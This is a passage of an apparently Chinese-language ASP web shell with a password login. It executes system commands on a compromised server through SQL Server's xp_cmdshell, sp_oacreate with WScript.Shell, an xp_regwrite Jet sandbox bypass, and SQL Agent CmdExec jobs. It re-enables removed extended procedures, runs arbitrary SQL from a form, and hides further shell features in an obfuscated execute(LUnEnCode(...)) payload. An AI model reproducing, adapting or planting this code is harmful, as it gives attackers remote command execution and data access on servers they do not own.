 		       ADOCONN.OPEN "PROVIDER=SQLOLEDB.1;DATA SOURCE=" & SESSION("SERVER") & "," & SESSION("PORT") & ";PASSWORD=" & SESSION("PASS") & ";UID=" & SESSION("NAME")        

                       STRQUERY="SELECT COUNT(*) FROM MASTER.DBO.SYSOBJECTS WHERE XTYPE='X' AND NAME='XP_CMDSHELL'"
		       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY) 
		       IF RECRESULT(0) THEN
		       SESSION("XP_CMDSHELL")=1 
		       RESPONSE.WRITE "<FONT COLOR=RED>XP_CMDSHELL............. 存在!</FONT>"
                       ELSE
		       SESSION("XP_CMDSHELL")=0 
		       RESPONSE.WRITE "<FONT COLOR=RED>XP_CMDSHELL............. 不存在!</FONT>"
                       END IF
		       STRQUERY="SELECT COUNT(*) FROM MASTER.DBO.SYSOBJECTS WHERE XTYPE='X' AND NAME='SP_OACREATE'"
		       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY) 
		       IF RECRESULT(0) THEN 
		       RESPONSE.WRITE "<BR><FONT COLOR=RED>SP_OACREATE............. 存在!</FONT>"
		       SESSION("SP_OACREATE")=1
                       ELSE 
		       RESPONSE.WRITE "<BR><FONT COLOR=RED>SP_OACREATE............. 不存在!</FONT>"
                       SESSION("SP_OACREATE")=0
                       END IF
		       STRQUERY="SELECT COUNT(*) FROM MASTER.DBO.SYSOBJECTS WHERE XTYPE='X' AND NAME='XP_REGWRITE'"
		       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY) 
		       IF RECRESULT(0) THEN 
		       RESPONSE.WRITE "<BR><FONT COLOR=RED>XP_REGWRITE............. 存在!</FONT>"
		       SESSION("XP_REGWRITE")=1
                       ELSE 
		       RESPONSE.WRITE "<BR><FONT COLOR=RED>XP_REGWRITE............. 不存在!</FONT>"
		       SESSION("XP_REGWRITE")=0
                       END IF
		       STRQUERY="SELECT COUNT(*) FROM MASTER.DBO.SYSOBJECTS WHERE XTYPE='X' AND NAME='XP_SERVICECONTROL'"
		       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY) 
		       IF RECRESULT(0) THEN 
		       RESPONSE.WRITE "<BR><FONT COLOR=RED>XP_SERVICECONTROL 存在!</FONT>"
		       SESSION("XP_SERVICECONTROL")=1
                       ELSE 
		       RESPONSE.WRITE "<BR><FONT COLOR=RED>XP_SERVICECONTROL 不存在!</FONT>"
		       SESSION("XP_SERVICECONTROL")=0
                       END IF
                       ELSE 
                       RESPONSE.WRITE "<SCRIPT>ALERT('操作超时，重新登陆！')</SCRIPT>"
                       RESPONSE.WRITE "<CENTER><A HREF="&REQUEST.SERVERVARIABLES("URL")&"?SQLAAA=LOGOUT><FONT COLOR=BLACK>登陆超时</FONT>"
                       RESPONSE.END
                       END IF 

ELSEIF REQUEST("SQLAAA")="CMD" THEN
                       IF SESSION("LOGIN")<>"" THEN
                       IF SESSION("PRI")=1 THEN
		       IF REQUEST("TOOL")="XP_CMDSHELL" THEN
		       SET ADOCONN=SERVER.CREATEOBJECT("ADODB.CONNECTION") 
 		       ADOCONN.OPEN "PROVIDER=SQLOLEDB.1;DATA SOURCE=" & SESSION("SERVER") & "," & SESSION("PORT") & ";PASSWORD=" & SESSION("PASS") & ";UID=" & SESSION("NAME")
		       IF REQUEST.FORM("CMD")<>"" THEN 
  		       STRQUERY = "EXEC MASTER.DBO.XP_CMDSHELL '" & REQUEST.FORM("CMD") & "'" 
                       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY) 
                       IF NOT RECRESULT.EOF THEN 
                       DO WHILE NOT RECRESULT.EOF 
                       STRRESULT = STRRESULT & CHR(13) & RECRESULT(0) 
                       RECRESULT.MOVENEXT 
                       LOOP
		       END IF
		       SET RECRESULT = NOTHING
                       RESPONSE.WRITE "<TEXTAREA ROWS=10 COLS=50>"
                       RESPONSE.WRITE "利用"&REQUEST("TOOL")&"扩展执行"
                       RESPONSE.WRITE REQUEST.FORM("CMD") 
                       RESPONSE.WRITE STRRESULT
                       RESPONSE.WRITE "</TEXTAREA>"
		       END IF 
		       		       
                       ELSEIF REQUEST("TOOL")="SP_OACREATE" THEN 
		       SET ADOCONN=SERVER.CREATEOBJECT("ADODB.CONNECTION") 
 		       ADOCONN.OPEN "PROVIDER=SQLOLEDB.1;DATA SOURCE=" & SESSION("SERVER") & "," & SESSION("PORT") & ";PASSWORD=" & SESSION("PASS") & ";UID=" & SESSION("NAME")
		       IF REQUEST.FORM("CMD")<>"" THEN 
  		       STRQUERY = "CREATE TABLE [JNC](RESULTTXT NVARCHAR(1024) NULL);USE MASTER DECLARE @O INT EXEC SP_OACREATE 'WSCRIPT.SHELL',@O OUT EXEC SP_OAMETHOD @O,'RUN',NULL,'CMD /C "&REQUEST("CMD")&" > 8617.TMP',0,TRUE;BULK INSERT [JNC] FROM '8617.TMP' WITH (KEEPNULLS);"
		       ADOCONN.EXECUTE(STRQUERY)
                       STRQUERY = "SELECT * FROM JNC"
		       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY)
		       IF NOT RECRESULT.EOF THEN 
                       DO WHILE NOT RECRESULT.EOF 
                       STRRESULT = STRRESULT & CHR(13) & RECRESULT(0) 
                       RECRESULT.MOVENEXT 
                       LOOP 
                       END IF
		       SET RECRESULT = NOTHING
                       RESPONSE.WRITE "<TEXTAREA ROWS=10 COLS=50>"
		       RESPONSE.WRITE "利用"&REQUEST("TOOL")&"扩展执行"	
                       RESPONSE.WRITE REQUEST.FORM("CMD") 
                       RESPONSE.WRITE STRRESULT
                       RESPONSE.WRITE "</TEXTAREA>"
		       STRQUERY = "DROP TABLE [JNC];DECLARE @O INT EXEC SP_OACREATE 'WSCRIPT.SHELL',@O OUT EXEC SP_OAMETHOD @O,'RUN',NULL,'CMD /C DEL 8617.TMP'"
 		       ADOCONN.EXECUTE(STRQUERY)
		       END IF

                       ELSEIF REQUEST("TOOL")="XP_REGWRITE" THEN
                       IF SESSION("SYSTEM")="2000" THEN
                       PATH="C:\WINNT\SYSTEM32\IAS\IAS.MDB"
                       ELSE
                       PATH="C:\WINDOWS\SYSTEM32\IAS\IAS.MDB"
                       END IF
		       SET ADOCONN=SERVER.CREATEOBJECT("ADODB.CONNECTION") 
 		       ADOCONN.OPEN "PROVIDER=SQLOLEDB.1;DATA SOURCE=" & SESSION("SERVER") & "," & SESSION("PORT") & ";PASSWORD=" & SESSION("PASS") & ";UID=" & SESSION("NAME")
		       IF REQUEST.FORM("CMD")<>"" THEN
		       CMD=CHR(34)&"CMD.EXE /C "&REQUEST.FORM("CMD")&" > 8617.TMP"&CHR(34)
		       STRQUERY = "CREATE TABLE [JNC](RESULTTXT NVARCHAR(1024) NULL);EXEC MASTER..XP_REGWRITE 'HKEY_LOCAL_MACHINE','SOFTWARE\MICROSOFT\JET\4.0\ENGINES','SANDBOXMODE','REG_DWORD',0;SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=" & PATH &"','SELECT SHELL("&CMD&")');"
                       ADOCONN.EXECUTE(STRQUERY)
		       STRQUERY = "SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=" & PATH &"','SELECT SHELL("&CHR(34)&"CMD.EXE /C COPY 8617.TMP JNC.TMP"&CHR(34)&")');BULK INSERT [JNC] FROM 'JNC.TMP' WITH (KEEPNULLS);"
		       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY)
		       STRQUERY="SELECT * FROM [JNC];"
                       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY)
		       IF NOT RECRESULT.EOF THEN 
                       DO WHILE NOT RECRESULT.EOF 
                       STRRESULT = STRRESULT & CHR(13) & RECRESULT(0) 
                       RECRESULT.MOVENEXT 
                       LOOP 
                       END IF
                       SET RECRESULT = NOTHING
                       RESPONSE.WRITE "<TEXTAREA ROWS=10 COLS=50>"
                       RESPONSE.WRITE "利用"&REQUEST("TOOL")&"扩展执行"
                       RESPONSE.WRITE REQUEST.FORM("CMD") 
                       RESPONSE.WRITE STRRESULT
                       RESPONSE.WRITE "</TEXTAREA>"
		       STRQUERY = "DROP TABLE [JNC];EXEC MASTER..XP_REGWRITE 'HKEY_LOCAL_MACHINE','SOFTWARE\MICROSOFT\JET\4.0\ENGINES','SANDBOXMODE','REG_DWORD',1;SELECT * FROM OPENROWSET('MICROSOFT.JET.OLEDB.4.0',';DATABASE=" & PATH &"','SELECT SHELL("&CHR(34)&"CMD.EXE /C DEL 8617.TMP&&DEL JNC.TMP"&CHR(34)&")');"
		       ADOCONN.EXECUTE(STRQUERY)
		       END IF

		       ELSEIF REQUEST("TOOL")="SQLSERVERAGENT" THEN
		       SET ADOCONN=SERVER.CREATEOBJECT("ADODB.CONNECTION") 
 		       ADOCONN.OPEN "PROVIDER=SQLOLEDB.1;DATA SOURCE=" & SESSION("SERVER") & "," & SESSION("PORT") & ";PASSWORD=" & SESSION("PASS") & ";UID=" & SESSION("NAME")

		       IF REQUEST.FORM("CMD")<>"" THEN
                       IF SESSION("SQLSERVERAGENT")=0 THEN
                       STRQUERY = "EXEC MASTER.DBO.XP_SERVICECONTROL 'START','SQLSERVERAGENT';"
                       ADOCONN.EXECUTE(STRQUERY)
                       SESSION("SQLSERVERAGENT")=1
                       END IF

		       STRQUERY = "USE MSDB CREATE TABLE [JNCSQL](RESULTTXT NVARCHAR(1024) NULL) EXEC SP_DELETE_JOB NULL,'X' EXEC SP_ADD_JOB 'X' EXEC SP_ADD_JOBSTEP NULL,'X',NULL,'1','CMDEXEC','CMD /C "&REQUEST.FORM("CMD")&"' EXEC SP_ADD_JOBSERVER NULL,'X',@@SERVERNAME EXEC SP_START_JOB 'X';"
                       ADOCONN.EXECUTE(STRQUERY)
                       ADOCONN.EXECUTE(STRQUERY)
                       ADOCONN.EXECUTE(STRQUERY)
                    
                       RESPONSE.WRITE "<TEXTAREA ROWS=10 COLS=50>"
                       RESPONSE.WRITE "利用"&REQUEST("TOOL")&"扩展执行"
                       RESPONSE.WRITE REQUEST.FORM("CMD") 
                       RESPONSE.WRITE VBCRF
                       RESPONSE.WRITE "此扩展无回显，建议通过重定向查看命令结果"
                       RESPONSE.WRITE "</TEXTAREA>"
		       STRQUERY = "USE MSDB DROP TABLE [JNCSQL];"
                       ADOCONN.EXECUTE(STRQUERY)
                       END IF
                       ELSEIF REQUEST("TOOL")="" THEN 
                       RESPONSE.WRITE "<SCRIPT>ALERT('选择你要使用的扩展')</SCRIPT>"
                       END IF
                       ELSE
                       RESPONSE.WRITE "<SCRIPT>ALERT('权限不够哦！')</SCRIPT>"
                       END IF
                       ELSE 
                       RESPONSE.WRITE "<SCRIPT>ALERT('操作超时，重新登陆！')</SCRIPT>"
                       RESPONSE.WRITE "<CENTER><A HREF="&REQUEST.SERVERVARIABLES("URL")&"?SQLAAA=LOGOUT><FONT COLOR=BLACK>登陆超时</FONT>"
                       RESPONSE.END
                       END IF

ELSEIF REQUEST("SQLAAA")="RESUME" THEN
                       IF SESSION("LOGIN")<>"" THEN
                       SET ADOCONN=SERVER.CREATEOBJECT("ADODB.CONNECTION") 
 		       ADOCONN.OPEN "PROVIDER=SQLOLEDB.1;DATA SOURCE=" & SESSION("SERVER") & "," & SESSION("PORT") & ";PASSWORD=" & SESSION("PASS") & ";UID=" & SESSION("NAME")
                       IF SESSION("XP_CMDSHELL")=0 THEN
                       STRQUERY="DBCC ADDEXTENDEDPROC ('XP_CMDSHELL','XPLOG70.DLL')"
		       ADOCONN.EXECUTE(STRQUERY)	
                       RESPONSE.WRITE "<FONT COLOR=RED>已经尝试恢复XP_CMDSHELL</FONT>"
                       ELSEIF SESSION("SP_OACREATE")=0 THEN
		       STRQUERY="DBCC ADDEXTENDEDPROC ('SP_OACREATE','ODSOLE70.DLL')"
		       ADOCONN.EXECUTE(STRQUERY)	
                       RESPONSE.WRITE "<FONT COLOR=RED>已经尝试恢复SP_OACREATE</FONT>"
		       ELSEIF SESSION("XP_REGWRITE")=0 THEN
		       STRQUERY="DBCC ADDEXTENDEDPROC ('XP_REGWRITE','XPSTAR.DLL')"
		       ADOCONN.EXECUTE(STRQUERY)	
                       RESPONSE.WRITE "<FONT COLOR=RED>已经尝试恢复XP_REGWRITE</FONT>"	
		       ELSE RESPONSE.WRITE "<FONT COLOR=RED>恭喜！组件齐全</FONT>"	
                       END IF
                       ELSE 
                       RESPONSE.WRITE "<SCRIPT>ALERT('操作超时，重新登陆！')</SCRIPT>"
                       RESPONSE.WRITE "<CENTER><A HREF="&REQUEST.SERVERVARIABLES("URL")&"?SQLAAA=LOGOUT><FONT COLOR=BLACK>登陆超时</FONT>"
                       RESPONSE.END
                       END IF 	
                                
ELSEIF REQUEST("SQLAAA")="SQL" THEN
                       IF SESSION("LOGIN")<>"" THEN
		       IF REQUEST.FORM("SQL")<>"" THEN
                       SET ADOCONN=SERVER.CREATEOBJECT("ADODB.CONNECTION") 
 		       ADOCONN.OPEN "PROVIDER=SQLOLEDB.1;DATA SOURCE=" & SESSION("SERVER") & "," & SESSION("PORT") & ";PASSWORD=" & SESSION("PASS") & ";UID=" & SESSION("NAME")
                       STRQUERY=REQUEST.FORM("SQL")
                       SET RECRESULT = ADOCONN.EXECUTE(STRQUERY) 
                       IF NOT RECRESULT.EOF THEN 
                       DO WHILE NOT RECRESULT.EOF 
                       STRRESULT = STRRESULT & CHR(13) & RECRESULT(0) 
                       RECRESULT.MOVENEXT 
                       LOOP
		       END IF
		       SET RECRESULT = NOTHING
                       RESPONSE.WRITE "<TEXTAREA ROWS=10 COLS=50>"
                       RESPONSE.WRITE "执行SQL语句:"
                       RESPONSE.WRITE REQUEST.FORM("SQL") 
                       RESPONSE.WRITE STRRESULT
                       RESPONSE.WRITE "</TEXTAREA>"
                       END IF
                       ELSE 
                       RESPONSE.WRITE "<SCRIPT>ALERT('操作超时，重新登陆！')</SCRIPT>"
                       RESPONSE.WRITE "<CENTER><A HREF="&REQUEST.SERVERVARIABLES("URL")&"?SQLAAA=LOGOUT><FONT COLOR=BLACK>登陆超时</FONT>"
                       RESPONSE.END
                       END IF

ELSEIF REQUEST("SQLAAA")="LOGOUT" THEN
                       SET ADOCONN=NOTHING
                       SESSION("LOGIN")=""
                       SESSION("NAME")=""
                       SESSION("PASS")=""
                       SESSION("SERVER")=""
                       SESSION("PORT")=""
                       SESSION("SYSTEM")=""
                       SESSION("PRI")=""		              
END IF
IF SESSION("LOGIN")="" THEN
			   RESPONSE.WRITE "<FORM NAME=FORM METHOD=POST SQLAAA="&REQUEST.SERVERVARIABLES("URL")&">"
			   RESPONSE.WRITE "<P>SQL用户名："
			   RESPONSE.WRITE "<INPUT NAME=NAME TYPE=TEXT ID=NAME VALUE="&SESSION("NAME")&">"
 		           RESPONSE.WRITE "  SQL密码："
			   RESPONSE.WRITE "<INPUT NAME=PASS TYPE=PASSWORD ID=PASS VALUE="&SESSION("PASS")&">"
			   RESPONSE.WRITE "<P>SQL服务器："
			   RESPONSE.WRITE "<INPUT NAME=PORT TYPE=TEXT ID=SERVER VALUE=127.0.0.1>"
 		           RESPONSE.WRITE "  SQL端口："
			   RESPONSE.WRITE "<INPUT NAME=PORT TYPE=TEXT ID=PORT VALUE=1433>"
			   RESPONSE.WRITE "  <INPUT NAME=SQLAAA TYPE=SUBMIT VALUE=LOGIN>"
			   RESPONSE.WRITE "</FORM>"

ELSE                       RESPONSE.WRITE "<FORM NAME=FORM METHOD=POST SQLAAA="&REQUEST.SERVERVARIABLES("URL")&">"
			   RESPONSE.WRITE "<P>组件检测："
			   RESPONSE.WRITE "  <INPUT NAME=SQLAAA TYPE=HIDDEN VALUE=TEST>"
			   RESPONSE.WRITE "  <INPUT TYPE=SUBMIT VALUE=检测组件>"
			   RESPONSE.WRITE "</FORM>"

                           RESPONSE.WRITE "<FORM NAME=FORM METHOD=POST SQLAAA="&REQUEST.SERVERVARIABLES("URL")&">"
			   RESPONSE.WRITE "<P>组件恢复："
			   RESPONSE.WRITE "  <INPUT NAME=SQLAAA TYPE=HIDDEN VALUE=RESUME>"
			   RESPONSE.WRITE "  <INPUT TYPE=SUBMIT VALUE=恢复组件>"
			   RESPONSE.WRITE "</FORM>"

		           RESPONSE.WRITE "<FORM NAME=FORM METHOD=POST SQLAAA="&REQUEST.SERVERVARIABLES("URL")&">"
			   RESPONSE.WRITE "<P>系统命令："
			   RESPONSE.WRITE "  <INPUT NAME=CMD TYPE=TEXT>"
			   RESPONSE.WRITE "<SELECT NAME='TOOL' ><OPTION VALUE=''>----请选择运行程序的组件----</OPTION><OPTION VALUE=XP_CMDSHELL>XP_CMDSHELL</OPTION><OPTION VALUE=SP_OACREATE>SP_OACREATE</OPTION><OPTION VALUE=XP_REGWRITE>XP_REGWRITE</OPTION><OPTION VALUE=SQLSERVERAGENT>SQLSERVERAGENT</OPTION></OPTION></SELECT>"
			   RESPONSE.WRITE "  <INPUT NAME=SQLAAA TYPE=HIDDEN VALUE=CMD>"
			   RESPONSE.WRITE "  <INPUT TYPE=SUBMIT VALUE=执行>"
			   RESPONSE.WRITE "</FORM>"
		           RESPONSE.WRITE "<FORM NAME=FORM1 METHOD=POST SQLAAA="&REQUEST.SERVERVARIABLES("URL")&">"
			   RESPONSE.WRITE "<P>执行语句："
			   RESPONSE.WRITE "   <INPUT NAME=SQL TYPE=TEXT>"
			   RESPONSE.WRITE "  <INPUT NAME=SQLAAA TYPE=HIDDEN VALUE=SQL>"
			   RESPONSE.WRITE "  <INPUT TYPE=SUBMIT VALUE=执行>"			   
			   RESPONSE.WRITE "</FORM>"                   
END IF:End Function

execute(LUnEnCode("stnyhszK%isJ?NX%XWWe'Crwtk4ACfjwfy}jy4A'+.86-wmh+NXBNXekN%isJekn%isjefff+NXBNXe.jzwY%1jqnKurjY x-jqnKjyjqjI3txk%qqfHejxtqH3}hqjqnKte.qqFifjW3}hqjqnKt-jithsJQRYM3wj{wjXBfffe.5%1jxqfK%16%1jqnKurjY x-%jqnKy}jYsjuT3xk%B%}hqjqnKt%yjXe.'yhjogTrjyx~XjqnK3lsnyunwhX'-yhjogTjyfjwH%B%xk%yjXe.jzwY%15%1jqnKurjY x%+%'%C%'%+%irHkjI%+%'%h4%'+myfUqqjmX-%szW3x|%qqfHe.'y}y3irh'-myfuufr3wj{wjx%B%jqnKurjY xe.'yhjogTrjyx~XjqnK3lsnyunwhX'-yhjogTjyfjwH3wj{wjXBtxk%yjXe.'qqjmX3yunwhX\'-yhjogTjyfjwH3wj{wjXBx|%yjXe.'qqjmX3yunwhX\'-yhjogTjyfjwH3wj{wjXBx|%yjXey}jS%jrzxjW%wtwwJ%sTejxqjefff+NXBNXeqqfifjw3yztiyx3IIBfffe.irHkjI+'%h4%'+myfUqqjmX-hj}j3RHBII%yjXe..516-YgT-yhjogTjyfjwHBRH%yjXesjmy%'xj~'B.'yunwhx|'-rwtK3yxjzvjW%knesjmY%''CA.'irh'-rwtK3yxjzvjW%kNe'C,irh,Bxxfqh%,@599?ymlnjm@*556?myin|,Bjq~yX%fjwfy}jyAC,行执,Bjzqf{%,ynrgzx,Bju~y%yzusnA%C,'+irHkjI+',Bjzqf{%,*7>?myin|,Bjq~yX%,irh,Bjrfs%yzusnA'+NXBNXe'qqjmX3yunwhX\C'+ijphjmh+',xj~,Bjzqf{%,yunwhx|,Bjrfs%,}tgphjmh,Bju~y%hBxxfqh%yzusnA'+NXBNXe'@uxgs+@uxgs+C,*5<?myin|,Bjq~yX%,'+myfUqqjmX+',Bjzqf{%,UX,Bjrfs%yzusnA：径路QQJMX'+NXBNXe'C,yxtu,Bitmyjr%rwtkA'BNXe.'irh'-yxjzvjW%B%irHkjI%sjmY%''CA.'irh'-yxjzvjW%kNe''Bijphjmh%sjmy%'xj~'CA.'yunwhx|'-yxjzvjW%kne'j}j3irh'%B%myfUqqjmX%sjmY%''BmyfUqqjmX%kne.'myfUqqjmX'-stnxxjXBmyfUqqjmXe.'UX'-yxjzvjW%B%.'myfUqqjmX'-stnxxjX%sjmY%''CA.'UX'-yxjzvjW%kNe'ijphjmh%'Bijphjmh?.-qqjmX6irH%stnyhszK?stnyhszK%isJ?NX%XWW%%e'Cjqgfy4ACrwtk4A'+qwz~uth+'Cwy4ACiy4A'+NXBNX%%%%e'C,传上,Bjzqf{%,ynrgzX,Bjrfs%,ynrgzx,Bju~y%yzusnA%'+NXBNX%%%%e'C,:7,Bj nx%%,jqnk,Bju~y%,jqnKqfhtQ,Bjrfs%yzusnA%'+NXBNX%%%%e'C,59,Bj nx%,'+.'j}j3irha'+.'myfUwjiqtK'-stnxxjX-myfUjWW+',Bjzqf{%,myfUtY,Bjrfs%yzusnA：径路传上'+NXBNX%%%%e'CiyACwyA'+NXBNX%%%%e'C,fyfi2rwtk4ywfunyqzr,Bju~yhsj%,yxtUB7stnyhF+jqnKuZBstnyhFD'+QWZ+',Bstnyhf%,yxtu,Bitmyjr%,rwtKuZ,Bjrfs%rwtkA'+NXBNX%%%%e'C,wjysjh,Bslnqf%,5,Blsnhfuxqqjh%,5,Blsniifuqqjh%,5,Bwjiwtg%jqgfyACwgACwgACwgA'BNX%%%%ekN%isJ%%eisJ3jxstuxjW	e.-wwJ|tmX	eNX%XWW	eqwZphfG+NXBNX	elsnmytsBZ%yjX?lsnmytsBK%yjX	ekN%isJ	ekn%isJ		e'Cwjysjh4A！功成传上'+jrfSZ+'件文CwgACwgACwgACwjysjhA'BNX%%%%%%%%%%esjmY%5Bwjgrzs3wwJ%kN%%%%%%%%ejrfSZ%xFj{fX3K%%%%%%%%ejxqJ%%%%e'&传上件文个一择选后径路全完的传上入输请CwgA'BNX%%%%%%esjmy%5Bj nXjqnK3K%wT%''BjrfSZ%kN%%%%e.'myfUtY'-rwtk3ZBjrfSZ	e.'jqnKqfhtQ'-FZ3ZBK%yjX%?%HUZ%|jsBZ%yjX%%%%esjmY%'yxtU'B.'7stnyhF'-yxjzvjW%kN?.-jqnKuZ%stnyhszK?stnyhszK%isJ?kn%isj%%eX%B%jithsJQRYM%%%%e.'@uxgs+'%1.57-WMH%1X-jhfqujw%B%X%%%%e.'@ytzv+'%1.98-WMH%1X-jhfqujw%B%X%%%%e.'@>8(+'%1.>8-WMH%1X-jhfqujw%B%X%%%%e.'@yq+'%1'A'%1X-jhfqujw%B%X%%%%e.'@yl+'%1'C'%1X-jhfqujw%B%X%%%%esjmy%.X-qqzsxn%yts%kn?.X-jithsJQRYM%stnyhszK?stnyhszK%isJ?lsnmytS%B%RXT%yjXejxtqH3RXTemxzqK3jxstuxjWeifjW3RXT%jynw\~wfsnG3jxstuxjWe'rfjwyx2yjyht4stnyfhnquuf'%B%ju~YysjystH3jxstuxjWe'=2KYZ'%B%yjxwfmH3jxstuxjWej nX3RXT%1'mylsjQ2ysjystH'%wjifjMiiF3jxstuxjWe. x1myfu-inR%+%'Bjrfsjqnk%@ysjrmhfyyf'%1'stnynxtuxnI2ysjystH'%wjifjMiiF3jxstuxjWe60.'a'1myfu-{jWwyxsNB xemyfU%jqnKrtwKiftQ3RXTe6%B%ju~Y3RXTesjuT3RXTe..51;-YgT-yhjogTjyfjwH%B%RXT%yjXewfjqH3jxstuxjW?.myfU-jqnKs|tI%stnyhszK?stnyhszK%isJ?NX%XWWey}jSe'Cwy4ACiy4A'+.71n-YgT+'CykjqBslnqf%,KKKKKK(,Bwtqthlg%iyACiy4A'+.61n-YgT+'C,KKKKKK(,Bwtqthlg%iyACiy4A'+.51n-YgT+'C,KKKKKK(,Bwtqthlg%,557,Bmyin|%,57,Bymlnjm%iyAC,wjysjh,Bslnqf%wyA'+NXBNXe86%tY%5Bn%wtKe'Cwy4ACiy4A'+.'JWF\YKTXdWJ[WJX'-xjqgfnwf[wj{wjX3yxjzvjW+'C,KKKKKK(,Bwtqthlg%iyACiy4A@uxgs+C,KKKKKK(,Bwtqthlg%iyACiy4A本版器务服GJ\C,KKKKKK(,Bwtqthlg%,557,Bmyin|%,57,Bymlnjm%iyAC,wjysjh,Bslnqf%wyA'+NXBNXe'Cwy4ACiy4A'+.'XT'-xjqgfnwf[wj{wjX3yxjzvjW+'C,KKKKKK(,Bwtqthlg%iyACiy4A@uxgs+C,KKKKKK(,Bwtqthlg%iyACiy4A统系作操器务服C,KKKKKK(,Bwtqthlg%,557,Bmyin|%,57,Bymlnjm%iyAC,wjysjh,Bslnqf%wyA'+NXBNXe'Cwy4ACiy4A'+.'XWTXXJHTWUdKTdWJGRZS'-xjqgfnwf[wj{wjX3yxjzvjW+'C,KKKKKK(,Bwtqthlg%iyACiy4A@uxgs+C,KKKKKK(,Bwtqthlg%iyACiy4A量数ZUH器务服C,KKKKKK(,Bwtqthlg%,557,Bmyin|%,57,Bymlnjm%iyAC,wjysjh,Bslnqf%wyA'+NXBNXe'Cwy4ACiy4A@uxgs+'+|ts+'C,KKKKKK(,Bwtqthlg%iyACiy4A@uxgs+C,KKKKKK(,Bwtqthlg%iyACiy4A间时器务服C,KKKKKK(,Bwtqthlg%,557,Bmyin|%,57,Bymlnjm%iyAC,wjysjh,Bslnqf%wyA'+NXBNXe'Crwtk4ACwy4ACiy4AC,7,Bjzqf{%,stnyhf,Bjrfs%,sjiinm,Bju~y%yzusnAC,}u5?wjiwtg,Bjq~yx,地在所器务服此询查,Bjzqf{%,ynrgzx,Bju~y%yzusnAC,}u5?wjiwtg,Bjq~yx,'+.'WIIFdQFHTQ'-xjqgfnwf[wj{wjX3yxjzvjW+',Bjzqf{%,:6,Bj nx%,un,Bjrfs%,y}jy,Bju~y%yzusnA'+NXBNXe'C,KKKKKK(,Bwtqthlg%iyACiy4A@uxgs+C,KKKKKK(,Bwtqthlg%iyACiy4AUN器务服C,KKKKKK(,Bwtqthlg%,557,Bmyin|%,57,Bymlnjm%iyAC,wjysjh,Bslnqf%wyAC,psfqgd,Byjlwfy%,rwtkun,Bjrfs%,uxf3xun4rth3=86un3|||44?uyym,Bstnyhf%yxtuBitmyjr%rwtkA'+NXBNXe'Cwy4ACiy4A'+.'JRFSdWJ[WJX'-xjqgfnwf[wj{wjx3yxjzvjw+'C,KKKKKK(,Bwtqthlg%iyACiy4A@uxgs+C,KKKKKK(,Bwtqthlg%iyACiy4A名器务服C,KKKKKK(,Bwtqthlg%,557,Bmyin|%,57,Bymlnjm%iyAC,wjysjh,Bslnqf%wyA'+NXBNXe'Cwy4ACiy4A息信件组器务服C,zsjr,Bwtqthlg%,wjysjh,Bslnqf%,8,Bsfuxqth%,57,Bymlnjm%iyACwyA'+NXBNXe'C,wjysjh,Bslnqf%,5,Blsniifuqqjh%,6,Blsnhfuxqqjh%,5,Bwjiwtg%,zsjr,Bwtqthlg%,*5=,Bmyin|%jqgfyACwgA'BNX?.-tksNwj{wjX%stnyhszK"))

Function CreateMdb(Path):SI="<br><br>"
   Set C = CreateObject(ObT(2,0)) 
   C.Create("Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & Path)
   Set C = Nothing
   If Err.number=0 Then
     SI = SI & Path & "建立成功!"
   End If
   SI=SI&BackUrl 
   RRS SI:End function:Function CompactMdb(Path):If Not ObT(0,1) Then
    Set C=CreateObject(ObT(3,0)) 
      C.CompactDatabase "Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&Path&",Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" &Path
	Set C=Nothing
Else
  Set FSO=CreateObject(ObT(0,1))
  If FSO.FileExists(Path) Then
    Set C=CreateObject(ObT(3,0)) 
      C.CompactDatabase "Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&Path&",Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" &Path&"_bak"
	Set C=Nothing
    FSO.DeleteFile Path
	FSO.MoveFile Path&"_bak",Path
  Else
    SI="<center><br><br><br>数据库"&Path&"没有发现！</center>" 
	Err.number=1
  End If
  Set FSO=Nothing
End If
  If Err.number=0 Then
    SI="<center><br><br><br>数据库"&Path&"压缩成功！</center>"
  End If
  SI=SI&BackUrl
  RRS SI:End Function
if session("web2a2dmin")<>UserPass then
if request.form("pass")<>"" then
if request.form("pass")=UserPass then
session("web2a2dmin")=UserPass
response.redirect url
else
 rrs"<br><br><br><br><br><br><br><br><img src="&userpass&" height=2222222></img><center>密码不正确,请确认是否输入有误！</center>"
end if
else
si="<center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><br><a href='"&SiteURL&"' target='_blank'>"&mname&"</a><form action='"&url&"' method='post'>输入密码：<input name='pass' type='password' size='22'> <input type='submit' value='登陆'><br><br><br><font color=#3399FF>"&Copyright&"</font><br>"&sers&"</div></center>"
if instr(SI,SIC)<>0 then rrs sI
end if
response.end
end if:Function DbManager():SqlStr=Trim(Request.Form("SqlStr"))
  DbStr=Request.Form("DbStr")
  SI=SI&"<table width='650'  border='0' cellspacing='0' cellpadding='0'>"
  SI=SI&"<form name='DbForm' method='post' action=''>"
  SI=SI&"<tr><td width='100' height='27'> &nbsp;数据库连接串:</td>"
  SI=SI&"<td><input name='DbStr' style='width:470' value="""&DbStr&"""></td>"
  SI=SI&"<td width='60' align='center'><select name='StrBtn' onchange='return FullDbStr(options[selectedIndex].value)'><option value=-1>连接串示例</option><option value=0>Access连接</option>"
  SI=SI&"<option value=1>MsSql连接</option><option value=2>MySql连接</option><option value=3>DSN连接</option>"
  SI=SI&"<option value=-1>--SQL语法--</option><option value=4>显示数据</option><option value=5>添加数据</option>"
  SI=SI&"<option value=6>删除数据</option><option value=7>修改数据</option><option value=8>建数据表</option>"
  SI=SI&"<option value=9>删数据表</option><option value=10>添加字段</option><option value=11>删除字段</option>"
  SI=SI&"<option value=12>完全显示</option></select></td></tr>"
  SI=SI&"<input name='Action' type='hidden' value='DbManager'><input name='Page' type='hidden' value='1'>"
  SI=SI&"<tr><td height='30'>&nbsp;SQL操作命令:</td>"
